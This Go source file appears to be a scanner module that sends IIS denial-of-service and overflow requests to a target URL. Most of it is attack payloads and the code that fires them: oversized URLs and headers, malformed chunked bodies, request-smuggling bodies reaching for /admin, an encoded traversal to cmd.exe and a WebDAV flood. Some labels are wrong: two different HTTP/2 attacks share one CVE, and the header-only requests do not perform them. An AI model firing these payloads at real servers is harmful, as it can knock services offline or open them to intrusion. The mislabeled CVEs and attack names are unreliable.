package modules

import (
	"bytes"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// BufferOverflowDoSModule detects IIS buffer overflow and DoS vulnerabilities
type BufferOverflowDoSModule struct {
	*BaseModule
	client  *http.Client
	baseURL string
	attacks []DoSAttack
}

// DoSAttack DoS attack structure
type DoSAttack struct {
	Name        string
	Description string
	Method      string
	Target      string
	Payload     string
	Headers     map[string]string
	CVE         string
	RiskLevel   string
	TestType    string
}

// NewBufferOverflowDoSModule creates a new buffer overflow & DoS module
func NewBufferOverflowDoSModule(client *http.Client, baseURL string) *BufferOverflowDoSModule {
	module := &BufferOverflowDoSModule{
		BaseModule: NewBaseModule("IIS Buffer Overflow & DoS", "IIS buffer overflow and denial of service vulnerability detection"),
		client:     client,
		baseURL:    baseURL,
	}
	module.initAttacks()
	return module
}

// initAttacks initializes the DoS attack list
func (m *BufferOverflowDoSModule) initAttacks() {
	m.attacks = []DoSAttack{
		// Long URL Attacks
		{
			Name:        "Long URL Buffer Overflow",
			Description: "Extremely long URL to trigger buffer overflow",
			Method:      "GET",
			Target:      "/",
			Payload:     strings.Repeat("A", 65536),
			CVE:         "CVE-2002-0079",
			RiskLevel:   "HIGH",
			TestType:    "url_overflow",
		},
		{
			Name:        "Long Query String Attack",
			Description: "Long query string to exhaust server resources",
			Method:      "GET",
			Target:      "/",
			Payload:     "?" + strings.Repeat("param="+strings.Repeat("A", 1000)+"&", 100),
			CVE:         "",
			RiskLevel:   "MEDIUM",
			TestType:    "query_overflow",
		},
		{
			Name:        "Deep Directory Path",
			Description: "Extremely deep directory path structure",
			Method:      "GET",
			Target:      "/" + strings.Repeat("deep/", 1000) + "file.asp",
			Payload:     "",
			CVE:         "",
			RiskLevel:   "MEDIUM",
			TestType:    "path_overflow",
		},
		// HTTP Header Overflow Attacks
		{
			Name:        "User-Agent Header Overflow",
			Description: "Oversized User-Agent header to trigger buffer overflow",
			Method:      "GET",
			Target:      "/",
			Payload:     "",
			Headers: map[string]string{
				"User-Agent": strings.Repeat("Mozilla/5.0 ", 10000),
			},
			CVE:       "CVE-2003-0109",
			RiskLevel: "HIGH",
			TestType:  "header_overflow",
		},
		{
			Name:        "Cookie Header Overflow",
			Description: "Oversized Cookie header to exhaust memory",
			Method:      "GET",
			Target:      "/",
			Payload:     "",
			Headers: map[string]string{
				"Cookie": strings.Repeat("session="+strings.Repeat("A", 1000)+"; ", 100),
			},
			CVE:       "",
			RiskLevel: "MEDIUM",
			TestType:  "header_overflow",
		},
		{
			Name:        "Authorization Header Overflow",
			Description: "Oversized Authorization header attack",
			Method:      "GET",
			Target:      "/",
			Payload:     "",
			Headers: map[string]string{
				"Authorization": "Basic " + strings.Repeat("A", 100000),
			},
			CVE:       "",
			RiskLevel: "HIGH",
			TestType:  "header_overflow",
		},
		{
			Name:        "Accept Header Overflow",
			Description: "Oversized Accept header to trigger parsing errors",
			Method:      "GET",
			Target:      "/",
			Payload:     "",
			Headers: map[string]string{
				"Accept": strings.Repeat("text/html,application/xml,", 5000),
			},
			CVE:       "",
			RiskLevel: "MEDIUM",
			TestType:  "header_overflow",
		},
		// Chunked Encoding Attacks
		{
			Name:        "Malformed Chunked Encoding",
			Description: "Malformed chunked transfer encoding attack",
			Method:      "POST",
			Target:      "/",
			Payload:     "FFFFFFFF\r\n" + strings.Repeat("A", 1000) + "\r\n0\r\n\r\n",
			Headers: map[string]string{
				"Transfer-Encoding": "chunked",
				"Content-Type":      "application/x-www-form-urlencoded",
			},
			CVE:       "CVE-2005-2089",
			RiskLevel: "HIGH",
			TestType:  "chunked_encoding",
		},
		{
			Name:        "Invalid Chunk Size",
			Description: "Invalid chunk size in chunked encoding",
			Method:      "POST",
			Target:      "/",
			Payload:     "ZZZZZZZZ\r\n" + strings.Repeat("B", 500) + "\r\n0\r\n\r\n",
			Headers: map[string]string{
				"Transfer-Encoding": "chunked",
			},
			CVE:       "",
			RiskLevel: "MEDIUM",
			TestType:  "chunked_encoding",
		},
		// HTTP Request Smuggling
		{
			Name:        "HTTP Request Smuggling CL.TE",
			Description: "HTTP request smuggling using Content-Length and Transfer-Encoding",
			Method:      "POST",
			Target:      "/",
			Payload:     "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: vulnerable.com\r\n\r\n",
			Headers: map[string]string{
				"Content-Length":    "44",
				"Transfer-Encoding": "chunked",
			},
			CVE:       "",
			RiskLevel: "HIGH",
			TestType:  "request_smuggling",
		},
		{
			Name:        "HTTP Request Smuggling TE.CL",
			Description: "HTTP request smuggling using Transfer-Encoding and Content-Length",
			Method:      "POST",
			Target:      "/",
			Payload:     "5c\r\nGET /admin HTTP/1.1\r\nHost: vulnerable.com\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n",
			Headers: map[string]string{
				"Transfer-Encoding": "chunked",
				"Content-Length":    "4",
			},
			CVE:       "",
			RiskLevel: "HIGH",
			TestType:  "request_smuggling",
		},
		// HTTP/2 Specific Attacks
		{
			Name:        "HTTP/2 CONTINUATION Flood",
			Description: "HTTP/2 CONTINUATION frame flood attack",
			Method:      "GET",
			Target:      "/",
			Payload:     "",
			Headers: map[string]string{
				"Upgrade":    "h2c",
				"Connection": "Upgrade, HTTP2-Settings",
			},
			CVE:       "CVE-2023-44487",
			RiskLevel: "HIGH",
			TestType:  "http2_attack",
		},
		{
			Name:        "HTTP/2 Rapid Reset",
			Description: "HTTP/2 rapid reset attack",
			Method:      "GET",
			Target:      "/",
			Payload:     "",
			Headers: map[string]string{
				"Upgrade":           "h2c",
				"Connection":        "Upgrade, HTTP2-Settings",
				"HTTP2-Settings":    "AAMAAABkAARAAAAAAAIAAAAA",
			},
			CVE:       "CVE-2023-44487",
			RiskLevel: "CRITICAL",
			TestType:  "http2_attack",
		},
		// IIS Specific DoS
		{
			Name:        "IIS ISAPI Extension DoS",
			Description: "IIS ISAPI extension denial of service",
			Method:      "GET",
			Target:      "/scripts/..%255c../winnt/system32/cmd.exe",
			Payload:     "",
			CVE:         "CVE-2000-0884",
			RiskLevel:   "HIGH",
			TestType:    "isapi_dos",
		},
		{
			Name:        "IIS WebDAV DoS",
			Description: "IIS WebDAV denial of service attack",
			Method:      "PROPFIND",
			Target:      "/",
			Payload:     strings.Repeat("<D:prop><D:displayname/></D:prop>", 10000),
			Headers: map[string]string{
				"Content-Type": "text/xml",
				"Depth":        "infinity",
			},
			CVE:       "",
			RiskLevel: "MEDIUM",
			TestType:  "webdav_dos",
		},
		// Resource Exhaustion
		{
			Name:        "Connection Pool Exhaustion",
			Description: "Exhaust IIS connection pool",
			Method:      "GET",
			Target:      "/",
			Payload:     "",
			Headers: map[string]string{
				"Connection": "keep-alive",
				"Keep-Alive": "timeout=3600, max=10000",
			},
			CVE:       "",
			RiskLevel: "MEDIUM",
			TestType:  "connection_exhaustion",
		},
	}
}

// Run executes the module
func (m *BufferOverflowDoSModule) Run() ([]*Vulnerability, error) {
	var vulnerabilities []*Vulnerability

	for _, attack := range m.attacks {
		testURL := m.buildTestURL(attack)
		start := time.Now()
		resp, err := m.performAttack(testURL, attack)
		responseTime := time.Since(start)

		if m.isDoSIndicator(err, responseTime) {
			evidence := fmt.Sprintf("DoS attack successful: %s", err.Error())
			vuln := m.createDoSVulnerability(attack, testURL, evidence, responseTime)
			vulnerabilities = append(vulnerabilities, vuln)
			continue
		}

		if resp != nil {
			defer resp.Body.Close()
			if m.isVulnerableResponse(resp, attack, responseTime) {
				evidence := fmt.Sprintf("Server responded with status %d", resp.StatusCode)
				vuln := m.createDoSVulnerability(attack, testURL, evidence, responseTime)
				vulnerabilities = append(vulnerabilities, vuln)
			}
		}
	}

	return vulnerabilities, nil
}

// buildTestURL builds the test URL
func (m *BufferOverflowDoSModule) buildTestURL(attack DoSAttack) string {
	baseURL, _ := url.Parse(m.baseURL)
	testURL := baseURL.ResolveReference(&url.URL{Path: attack.Target})
	return testURL.String() + attack.Payload
}

func (m *BufferOverflowDoSModule) performAttack(testURL string, attack DoSAttack) (*http.Response, error) {
	var req *http.Request
	var err error

	if attack.Method == "POST" && attack.Payload != "" {
		req, err = http.NewRequest(attack.Method, testURL, bytes.NewBufferString(attack.Payload))
	} else {
		req, err = http.NewRequest(attack.Method, testURL, nil)
	}

	if err != nil {
		return nil, err
	}

	// Add custom headers
	for key, value := range attack.Headers {
		req.Header.Set(key, value)
	}

	// Set timeout for DoS tests
	client := *m.client
	client.Timeout = 15 * time.Second

	return client.Do(req)
}

// isDoSIndicator checks for DoS indicators
func (m *BufferOverflowDoSModule) isDoSIndicator(err error, responseTime time.Duration) bool {
	if err == nil {
		return false
	}

	errorStr := strings.ToLower(err.Error())
	
	// Check for timeout or connection errors
	if strings.Contains(errorStr, "timeout") ||
		strings.Contains(errorStr, "connection reset") ||
		strings.Contains(errorStr, "connection refused") ||
		strings.Contains(errorStr, "no route to host") {
		return true
	}

	// Check for extremely slow response
	if responseTime > 10*time.Second {
		return true
	}

	return false
}

// isVulnerableResponse checks for vulnerable response
func (m *BufferOverflowDoSModule) isVulnerableResponse(resp *http.Response, _ DoSAttack, _ time.Duration) bool {
	// Check for server errors
	if resp.StatusCode >= 500 {
		return true
	}
	return false
}

// createDoSVulnerability creates a DoS vulnerability
func (m *BufferOverflowDoSModule) createDoSVulnerability(attack DoSAttack, testURL, evidence string, responseTime time.Duration) *Vulnerability {
	severity := m.getSeverityFromRisk(attack.RiskLevel)
	cvss := m.getCVSSFromRisk(attack.RiskLevel)

	vulnerability := &Vulnerability{
		ID:          fmt.Sprintf("IIS-DOS-%s", strings.ToUpper(strings.ReplaceAll(attack.Name, " ", "-"))),
		Title:       fmt.Sprintf("DoS Vulnerability - %s", attack.Name),
		Description: attack.Description,
		Severity:    severity,
		CVSS:        cvss,
		CWE:         "CWE-400",
		OWASP:       "A06:2021 – Vulnerable and Outdated Components",
		URL:         testURL,
		Method:      attack.Method,
		Payload:     attack.Payload,
		Evidence:    fmt.Sprintf("%s (Response time: %.2f seconds)", evidence, responseTime.Seconds()),
		References: []string{
			"https://owasp.org/www-community/attacks/Denial_of_Service",
		},
		Remediation: "Implement rate limiting, input validation, and resource limits to prevent DoS attacks.",
		Metadata: map[string]string{
			"attack_type":   attack.TestType,
			"response_time": fmt.Sprintf("%.2f", responseTime.Seconds()),
		},
	}

	if attack.CVE != "" {
		vulnerability.References = append(vulnerability.References,
			fmt.Sprintf("https://cve.mitre.org/cgi-bin/cvename.cgi?name=%s", attack.CVE))
	}

	return vulnerability
}

// getSeverityFromRisk returns severity from risk level
func (m *BufferOverflowDoSModule) getSeverityFromRisk(riskLevel string) string {
	switch riskLevel {
	case "CRITICAL":
		return "CRITICAL"
	case "HIGH":
		return "HIGH"
	case "MEDIUM":
		return "MEDIUM"
	case "LOW":
		return "LOW"
	default:
		return "MEDIUM"
	}
}

// getCVSSFromRisk returns CVSS score from risk level
func (m *BufferOverflowDoSModule) getCVSSFromRisk(riskLevel string) float64 {
	switch riskLevel {
	case "CRITICAL":
		return 9.8
	case "HIGH":
		return 7.5
	case "MEDIUM":
		return 5.3
	case "LOW":
		return 3.1
	default:
		return 5.3
	}
}
